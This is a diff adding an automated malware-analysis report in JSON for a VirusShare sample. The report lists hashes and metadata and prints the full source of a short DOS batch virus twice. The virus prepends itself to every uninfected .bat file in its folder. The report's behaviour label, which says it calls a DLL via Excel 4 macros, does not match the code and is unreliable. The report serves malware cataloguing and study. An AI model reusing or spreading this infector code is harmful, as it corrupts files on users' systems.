@@ -1,0 +1,52 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "call": "May call a DLL using Excel 4 Macros"
+        },
+        "macro": "@echo off %MF%\nif \"%1==\"MF goto $MF\nfor %%b in (*.bat) do call %0 MF %%b\ndel $MF\ngoto MFE\n:$MF\nfind \"MF\"<%2>nul\nif errorlevel 1 goto MFz\ngoto close %MF%\n:MFz\nfind \"MF\"<%0>$MF\ntype %2>>$MF\necho.>>$MF\necho :close>>$MF\ntype $MF>%2\ngoto close %MF%\n:MFE\necho on %MF%\n:close"
+    },
+    "filename": "VirusShare_577b97d6ccb61185f00b14e2f5ec4269",
+    "filesize": 288,
+    "filetype": "DOS batch file, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "577b97d6ccb61185f00b14e2f5ec4269",
+        "sha1": "91b119acb3163570483598af9cf54e1818aaa6c1",
+        "sha256": "51e291a51158f1eb488bb3a199535b95ccbd0b81a07e59771865e29c1bc4f5cc"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "@echo off %MF%",
+            "if \"%1==\"MF goto $MF",
+            "for %%b in (*.bat) do call %0 MF %%b",
+            "del $MF",
+            "goto MFE",
+            ":$MF",
+            "find \"MF\"<%2>nul",
+            "if errorlevel 1 goto MFz",
+            "goto close %MF%",
+            ":MFz",
+            "find \"MF\"<%0>$MF",
+            "type %2>>$MF",
+            "echo.>>$MF",
+            "echo :close>>$MF",
+            "type $MF>%2",
+            "goto close %MF%",
+            ":MFE",
+            "echo on %MF%",
+            ":close"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.284640",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
